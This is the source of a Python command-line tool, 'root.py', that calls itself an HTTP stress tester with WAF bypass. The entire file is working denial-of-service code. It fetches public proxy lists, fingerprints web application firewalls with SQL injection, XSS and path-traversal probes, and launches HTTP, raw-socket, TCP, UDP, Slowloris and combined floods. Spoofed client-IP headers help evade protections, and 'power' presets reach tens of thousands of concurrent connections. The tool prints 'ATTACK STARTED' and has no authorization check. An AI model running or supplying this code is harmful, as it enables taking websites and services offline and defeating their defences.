#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys,os,subprocess,importlib,importlib.util,argparse,time,json,re,threading,random,socket,ssl,struct,string
__version__="4.0.0"
REQUIRED={"requests":"requests","aiohttp":"aiohttp"}
def ensure_deps():
    missing={i:p for i,p in REQUIRED.items() if importlib.util.find_spec(i) is None}
    if not missing:return
    print("\n"+"="*55+"\n  MISSING DEPENDENCIES\n"+"="*55)
    for idx,(i,p) in enumerate(missing.items(),1):print(f"    {idx}. {p:<25} ({i})")
    print("-"*55)
    while True:
        try:a=input("  Install now? [Y/n]: ").strip().lower()
        except:sys.exit(1)
        if a in("","y","yes","e","evet"):break
        if a in("n","no","h","hayir"):sys.exit(1)
    for i,p in missing.items():
        print(f"    -> {p} ... ",end="",flush=True)
        try:subprocess.check_call([sys.executable,"-m","pip","install",p,"--quiet"],stdout=subprocess.DEVNULL,stderr=subprocess.PIPE);print("OK")
        except:print("FAIL");sys.exit(1)
    print("[+] Ready!\n")
ensure_deps()
import asyncio,requests,aiohttp
from urllib.parse import urlparse,urlencode
SCRIPT_DIR=os.path.dirname(os.path.abspath(__file__))
PROXY_FILE=os.path.join(SCRIPT_DIR,"proxies.txt")
PROXY_SOURCES=[
("ProxyScrape HTTP","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",""),
("SpeedX HTTP","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",""),
("SpeedX SOCKS4","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt","socks4://"),
("SpeedX SOCKS5","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt","socks5://"),
("Monosans HTTP","https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",""),
("Monosans SOCKS4","https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt","socks4://"),
("Monosans SOCKS5","https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt","socks5://"),
("Clarketm HTTP","https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",""),
]
proxy_list=[]
proxy_lock=threading.Lock()
def _fetch_src(name,url,prefix):
    px=[]
    try:
        r=requests.get(url,timeout=20,verify=True)
        r.raise_for_status()
        for ln in r.text.strip().splitlines():
            ln=ln.strip()
            if not ln or ln.startswith("#"):continue
            if ":" in ln:
                p=(prefix+ln) if prefix and not ln.startswith("socks") else ln
                if not p.startswith(("http://","https://","socks4://","socks5://")):p="http://"+p
                px.append(p)
    except Exception as e:
        pass
    return px
def update_proxies():
    global proxy_list
    print("\n"+"="*55+"\n  PROXY UPDATE\n"+"="*55)
    res={};threads=[]
    def w(i,n,u,p):res[i]=_fetch_src(n,u,p)
    for i,(n,u,p) in enumerate(PROXY_SOURCES):
        t=threading.Thread(target=w,args=(i,n,u,p));t.start();threads.append(t)
    for t in threads:t.join(timeout=30)
    all_p=[]
    for i,(n,_,_) in enumerate(PROXY_SOURCES):
        got=res.get(i,[])
        print(f"    [{n:<22}] {len(got) if got else 'FAIL'}")
        all_p.extend(got)
    proxy_list=list(dict.fromkeys(all_p))
    if proxy_list:
        with open(PROXY_FILE,"w") as f:
            for p in proxy_list:f.write(p+"\n")
        print(f"\n[+] {len(proxy_list)} proxies loaded")
    else:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE) as f:proxy_list=[l.strip() for l in f if l.strip() and not l.startswith("#")]
            print(f"[*] Using {len(proxy_list)} cached")
        else:print("[!] No proxies")
def get_proxy():
    if not proxy_list:return None
    with proxy_lock:return random.choice(proxy_list)

WAF_SIGS={"Cloudflare":(["cf-ray","cf-cache-status"],["__cfduid","cf_clearance","__cf_bm"],["cloudflare","ray ID"]),"AWS WAF":(["x-amzn-requestid"],["awsalb"],["Request blocked"]),"Akamai":(["x-akamai-transformed"],["ak_bmsc","bm_sv"],["Access Denied","Reference#"]),"Sucuri":(["x-sucuri-id"],["sucuri_cloudproxy"],["sucuri","cloudproxy"]),"Imperva":(["x-iinfo"],["incap_ses","visid_incap"],["incapsula","imperva"]),"ModSecurity":([],[],["modsecurity","mod_security"]),"F5 BIG-IP":(["x-wa-info"],["bigipserver"],["request rejected"]),"Wordfence":([],["wfvt_"],["wordfence"]),"DDoS-Guard":(["server"],["__ddg1"],["ddos-guard"]),"Cloudfront":(["x-amz-cf-id"],[],["cloudfront"])}
def detect_waf(resp):
    if resp is None:return[]
    hd={k.lower():v.lower() for k,v in resp.headers.items()}
    ck={k.lower():v for k,v in resp.cookies.items()}
    bd=resp.text.lower()[:5000];cd=resp.status_code;det=[]
    for name,(hs,cs,bs) in WAF_SIGS.items():
        sc=0
        for h in hs:
            if h in hd:sc+=2
        for c in cs:
            for cn in ck:
                if c in cn:sc+=3;break
        for b in bs:
            if b in bd:sc+=2
        if cd in(403,503):sc+=1
        if sc>=3:det.append((name,sc))
    det.sort(key=lambda x:x[1],reverse=True)
    return det
def scan_waf(url):
    res={"detected":[],"status":None,"server":None}
    try:
        r=requests.get(url,timeout=10,allow_redirects=True)
        res["status"]=r.status_code;res["server"]=r.headers.get("Server","?")
        for w,s in detect_waf(r):
            if w not in[x[0] for x in res["detected"]]:res["detected"].append((w,s))
    except:pass
    for probe in["?id=1' OR '1'='1","?t=<script>alert(1)</script>","?c=../../../etc/passwd"]:
        try:
            r=requests.get(url+probe,timeout=8,allow_redirects=True)
            for w,s in detect_waf(r):
                if w not in[x[0] for x in res["detected"]]:res["detected"].append((w,s))
        except:pass
    return res
def _rs(n=8):return''.join(random.choices(string.ascii_lowercase+string.digits,k=n))
def _rip():return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
UAS=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/121.0.0.0"]
REFS=["https://www.google.com/","https://www.bing.com/","https://www.yahoo.com/","https://duckduckgo.com/","https://www.facebook.com/",""]
class BypassStrategy:
    def __init__(s,waf=None):s.waf=waf
    def headers(s):
        h={"User-Agent":random.choice(UAS),"Accept":"text/html,*/*;q=0.8","Accept-Language":random.choice(["en-US,en;q=0.9","tr-TR,tr;q=0.9","de-DE,de;q=0.9"]),"Accept-Encoding":"gzip, deflate","Cache-Control":"no-cache","Referer":random.choice(REFS),"X-Forwarded-For":_rip(),"X-Real-IP":_rip()}
        if s.waf=="Cloudflare":h["CF-Connecting-IP"]=_rip()
        elif s.waf in("AWS WAF","Akamai"):h["X-Forwarded-For"]="127.0.0."+str(random.randint(1,254));h["X-Original-URL"]="/"
        elif s.waf in("Imperva","Sucuri"):h["True-Client-IP"]=_rip()
        return h
    def mutate_url(s,url):
        p=urlparse(url);path=p.path or "/"
        m=random.choice([lambda x:x,lambda x:x+"?"+_rs(5)+"="+_rs(10),lambda x:x+"/"+_rs(4),lambda x:x+";jsessionid="+_rs(32)])
        return f"{p.scheme}://{p.netloc}{m(path)}"

stats={"total":0,"success":0,"fail":0}
stop_event=threading.Event()
detected_waf=None
bypass_strat=None
def raw_http(host,port,path,use_ssl):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(5)
        if use_ssl:ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;s=ctx.wrap_socket(s,server_hostname=host)
        s.connect((host,port))
        qp="&".join(f"{_rs(4)}={_rs(8)}" for _ in range(random.randint(1,4)))
        rq=f"GET {path}?{qp} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAS)}\r\nAccept: */*\r\nX-Forwarded-For: {_rip()}\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n"
        s.send(rq.encode());s.close();return True
    except:
        try:s.close()
        except:pass
        return False
def raw_post(host,port,path,use_ssl):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(5)
        if use_ssl:ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;s=ctx.wrap_socket(s,server_hostname=host)
        s.connect((host,port))
        body="&".join(f"{_rs(6)}={_rs(random.randint(10,50))}" for _ in range(random.randint(3,8)))
        rq=f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAS)}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\nX-Forwarded-For: {_rip()}\r\nConnection: keep-alive\r\n\r\n{body}"
        s.send(rq.encode());s.close();return True
    except:
        try:s.close()
        except:pass
        return False
def tcp_flood(host,port):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(4)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_LINGER,struct.pack('ii',1,0))
        s.connect((host,port));s.send(random._urandom(random.randint(64,1024)));s.close();return True
    except:
        try:s.close()
        except:pass
        return False
def udp_flood(host,port):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.sendto(random._urandom(random.randint(64,65500)),(host,port));s.close();return True
    except:
        try:s.close()
        except:pass
        return False
def slowloris_hold(host,port):
    socks=[]
    while not stop_event.is_set():
        for _ in range(random.randint(5,20)):
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(10);s.connect((host,port))
                s.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAS)}\r\nConnection: keep-alive\r\nKeep-Alive: {random.randint(300,1200)}\r\nContent-Length: {random.randint(100,10000)}\r\n".encode())
                socks.append(s);stats["total"]+=1;stats["success"]+=1
            except:stats["fail"]+=1
        alive=[]
        for s in socks:
            try:s.send(f"X-a: {random.randint(1,5000)}\r\n".encode());alive.append(s)
            except:
                stats["fail"]+=1
                try:s.close()
                except:pass
        socks=alive;time.sleep(random.uniform(5,15))
    for s in socks:
        try:s.close()
        except:pass
async def async_worker(session,url,bp,method="GET"):
    try:
        h=bp.headers() if bp else{"User-Agent":random.choice(UAS),"X-Forwarded-For":_rip()}
        t=bp.mutate_url(url) if bp else url
        sep="&" if "?" in t else "?"
        t=f"{t}{sep}_={_rs(6)}"
        if method=="POST":
            async with session.post(t,headers=h,data={_rs(5):_rs(20) for _ in range(3)},timeout=aiohttp.ClientTimeout(total=8),ssl=False) as r:await r.read();return r.status<400
        elif method=="HEAD":
            async with session.head(t,headers=h,timeout=aiohttp.ClientTimeout(total=8),ssl=False) as r:return r.status<400
        else:
            async with session.get(t,headers=h,timeout=aiohttp.ClientTimeout(total=8),ssl=False) as r:await r.read();return r.status<400
    except:return False
async def async_loop(session,url,bp,method):
    ms=["GET","POST","HEAD"] if method=="MIXED" else[method]
    while not stop_event.is_set():
        ok=await async_worker(session,url,bp,random.choice(ms))
        stats["total"]+=1
        if ok:stats["success"]+=1
        else:stats["fail"]+=1
async def run_async(url,count,bp,method="GET"):
    conn=aiohttp.TCPConnector(limit=0,limit_per_host=0,ttl_dns_cache=300,force_close=False,keepalive_timeout=30)
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks=[asyncio.ensure_future(async_loop(session,url,bp,method)) for _ in range(count)]
        await asyncio.gather(*tasks,return_exceptions=True)

def raw_worker(host,port,path,use_ssl,method="GET"):
    while not stop_event.is_set():
        if method=="POST":ok=raw_post(host,port,path,use_ssl)
        elif method=="MIXED":ok=raw_http(host,port,path,use_ssl) if random.random()<0.6 else raw_post(host,port,path,use_ssl)
        else:ok=raw_http(host,port,path,use_ssl)
        stats["total"]+=1
        if ok:stats["success"]+=1
        else:stats["fail"]+=1
def tcp_worker(host,port):
    while not stop_event.is_set():
        ok=tcp_flood(host,port);stats["total"]+=1
        if ok:stats["success"]+=1
        else:stats["fail"]+=1
def udp_worker(host,port):
    while not stop_event.is_set():
        ok=udp_flood(host,port);stats["total"]+=1
        if ok:stats["success"]+=1
        else:stats["fail"]+=1
def monitor():
    start=time.time();prev=0
    while not stop_event.is_set():
        time.sleep(1);total=stats["total"]
        if total>prev:
            el=time.time()-start;rps=total/el if el>0 else 0;sr=(stats["success"]/total*100) if total else 0
            print(f"  [+] {total:>8} sent | {rps:>7.0f}/s | OK:{sr:>4.0f}% | WAF:{detected_waf or'None'}")
            prev=total
def run_waf_scan(url):
    global detected_waf,bypass_strat
    print("\n"+"="*55+"\n  WAF DETECTION\n"+"="*55+f"\n  Target: {url}\n  Probing ...\n")
    r=scan_waf(url)
    print(f"  Server: {r.get('server','?')}\n  Status: {r.get('status','?')}")
    if r["detected"]:
        print("\n  [!] WAF DETECTED:")
        for n,s in r["detected"]:print(f"      {n:<25} score:{s}")
        detected_waf=r["detected"][0][0];bypass_strat=BypassStrategy(detected_waf)
        print(f"\n  [*] Bypass: {detected_waf}")
    else:print("  [+] No WAF detected");bypass_strat=BypassStrategy(None)
    print("="*55)
def _async_thread(url,count,method):
    loop=asyncio.new_event_loop();asyncio.set_event_loop(loop)
    try:loop.run_until_complete(run_async(url,count,bypass_strat,method))
    except:pass
    finally:loop.close()
def launch(url,method,tc,ac):
    p=urlparse(url);host=p.hostname;port=p.port or(443 if p.scheme=="https" else 80);path=p.path or"/";use_ssl=p.scheme=="https"
    if method in("async","async-mixed"):
        m="MIXED" if method=="async-mixed" else "GET"
        print(f"  [*] {ac} async coroutines ...");loop=asyncio.new_event_loop();asyncio.set_event_loop(loop)
        try:loop.run_until_complete(run_async(url,ac,bypass_strat,m))
        except KeyboardInterrupt:pass
        finally:stop_event.set();loop.close()
    elif method in("raw-get","raw-post","raw-mixed"):
        m={"raw-get":"GET","raw-post":"POST","raw-mixed":"MIXED"}[method]
        print(f"  [*] {tc} raw socket threads ...");[threading.Thread(target=raw_worker,args=(host,port,path,use_ssl,m),daemon=True).start() for _ in range(tc)]
    elif method=="tcp":
        print(f"  [*] {tc} TCP threads ...");[threading.Thread(target=tcp_worker,args=(host,port),daemon=True).start() for _ in range(tc)]
    elif method=="udp":
        print(f"  [*] {tc} UDP threads ...");[threading.Thread(target=udp_worker,args=(host,port),daemon=True).start() for _ in range(tc)]
    elif method=="slowloris":
        print(f"  [*] {tc} slowloris threads ...");[threading.Thread(target=slowloris_hold,args=(host,port),daemon=True).start() for _ in range(tc)]
    elif method=="combo":
        print(f"  [*] COMBO: {ac} async + {tc} threads ...")
        g=int(tc*0.4);po=int(tc*0.3);tp=int(tc*0.2);sl=max(1,int(tc*0.1))
        [threading.Thread(target=raw_worker,args=(host,port,path,use_ssl,"GET"),daemon=True).start() for _ in range(g)]
        [threading.Thread(target=raw_worker,args=(host,port,path,use_ssl,"POST"),daemon=True).start() for _ in range(po)]
        [threading.Thread(target=tcp_worker,args=(host,port),daemon=True).start() for _ in range(tp)]
        [threading.Thread(target=slowloris_hold,args=(host,port),daemon=True).start() for _ in range(sl)]
        threading.Thread(target=_async_thread,args=(url,ac,"MIXED"),daemon=True).start()
BANNER=r"""
 ____   ___   ___ _____   ______   __   _  _    ___
|  _ \ / _ \ / _ \_   _| |  _ \ \ / / | || |  / _ \
| |_) | | | | | | || |   | |_) \ V /  | || |_| | | |
|  _ <| |_| | |_| || |   |  __/ | |   |__   _| |_| |
|_| \_\\___/ \___/ |_|   |_|    |_|      |_|(_)\___/
"""
MI={"async":"Async HTTP GET (max throughput)","async-mixed":"Async mixed GET/POST/HEAD","raw-get":"Raw socket GET","raw-post":"Raw socket POST","raw-mixed":"Raw socket mixed","tcp":"TCP flood","udp":"UDP flood","slowloris":"Slowloris","combo":"ALL combined"}
PP={"low":{"t":50,"a":500},"medium":{"t":200,"a":2000},"high":{"t":500,"a":5000},"extreme":{"t":1000,"a":10000},"max":{"t":2000,"a":20000}}
def main():
    global detected_waf,bypass_strat,proxy_list
    mh="\n".join(f"  {k:<14} {v}" for k,v in MI.items())
    pa=argparse.ArgumentParser(prog="root.py",description=f"HTTP Stress Test + WAF Bypass v{__version__}",formatter_class=argparse.RawDescriptionHelpFormatter,epilog=f"methods:\n{mh}\n\npower: low|medium|high|extreme|max\n\nexamples:\n  python3 root.py http://target.com -m combo --power max\n  python3 root.py http://target.com -m async -a 5000\n  python3 root.py http://target.com --waf-scan\n  python3 root.py --update-proxies")
    pa.add_argument("url",nargs="?");pa.add_argument("-m","--method",choices=list(MI.keys()),default="async")
    pa.add_argument("-t","--threads",type=int);pa.add_argument("-a","--async-count",type=int)
    pa.add_argument("--power",choices=list(PP.keys()));pa.add_argument("--no-proxy",action="store_true")
    pa.add_argument("--proxy-file",type=str);pa.add_argument("--waf-scan",action="store_true")
    pa.add_argument("--skip-waf",action="store_true");pa.add_argument("--update-proxies",action="store_true")
    pa.add_argument("-v","--version",action="version",version=f"v{__version__}")
    args=pa.parse_args()
    print(BANNER);print(f"  v{__version__} | Python {sys.version.split()[0]}\n")
    if args.update_proxies:update_proxies();sys.exit(0)
    if not args.url:pa.print_help();sys.exit(1)
    url=args.url
    if not url.startswith("http"):url="http://"+url
    if url.count("/")==2:url+="/"
    if args.power:pr=PP[args.power];tc=args.threads or pr["t"];ac=args.async_count or pr["a"]
    else:tc=args.threads or 200;ac=args.async_count or 2000
    if args.no_proxy:proxy_list=[]
    elif args.proxy_file:
        with open(args.proxy_file) as f:proxy_list=[l.strip() for l in f if l.strip() and not l.startswith("#")]
        print(f"[+] {len(proxy_list)} proxies")
    else:update_proxies()
    if not args.skip_waf:run_waf_scan(url)
    else:bypass_strat=BypassStrategy(None)
    if args.waf_scan:sys.exit(0)
    ia=args.method.startswith("async")
    print("\n"+"="*55+"\n  ATTACK STARTED\n"+"="*55)
    print(f"  Target : {url}\n  Method : {args.method}\n  Threads: {tc}\n  Async  : {ac}\n  Proxies: {len(proxy_list)}\n  WAF    : {detected_waf or'None'}\n  Stop   : Ctrl+C\n"+"="*55+"\n")
    threading.Thread(target=monitor,daemon=True).start()
    if ia:launch(url,args.method,tc,ac)
    else:
        launch(url,args.method,tc,ac)
        try:
            while not stop_event.is_set():time.sleep(1)
        except KeyboardInterrupt:stop_event.set()
    time.sleep(0.5);total=stats["total"];sr=(stats["success"]/total*100) if total else 0
    print(f"\n{'='*55}\n  RESULTS\n{'='*55}\n  Total  : {total:,}\n  OK     : {stats['success']:,} ({sr:.1f}%)\n  Fail   : {stats['fail']:,}\n{'='*55}")
if __name__=="__main__":main()
